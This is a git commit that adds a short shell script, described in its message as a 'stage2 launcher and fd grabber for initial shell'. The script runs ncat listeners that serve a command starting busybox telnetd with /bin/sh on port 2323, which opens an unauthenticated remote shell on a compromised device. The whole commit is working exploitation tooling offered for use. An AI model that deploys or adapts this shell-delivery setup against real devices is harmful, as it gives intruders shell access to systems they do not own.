1761960b421f42636c79dfc58cd4fcf492d8372d
Pedro Rocha <pedro-n-rocha@live.com>
2019-07-06 03:24:28 +0100

    yep stage2 launcher and fd grabber for initial shell

---
+++ dump/listner.sh
@@ -0,0 +1,5 @@
+ncat -vv -l 444 --keep-open -c 'cat exit' & 
+#ncat -vv -l 4444 --keep-open  -c 'echo "/dl/busy/telnetd -l /bin/sh -b 10.0.0.18:2323"'  
+ncat -vv -l 4444 --keep-open  -c 'echo "/dl/busy/bin/telnetd -l /bin/sh -b 0.0.0.0:2323"'  
+
+#ncat -v -l 444 --keep-open -c 'echo "AAAA"'
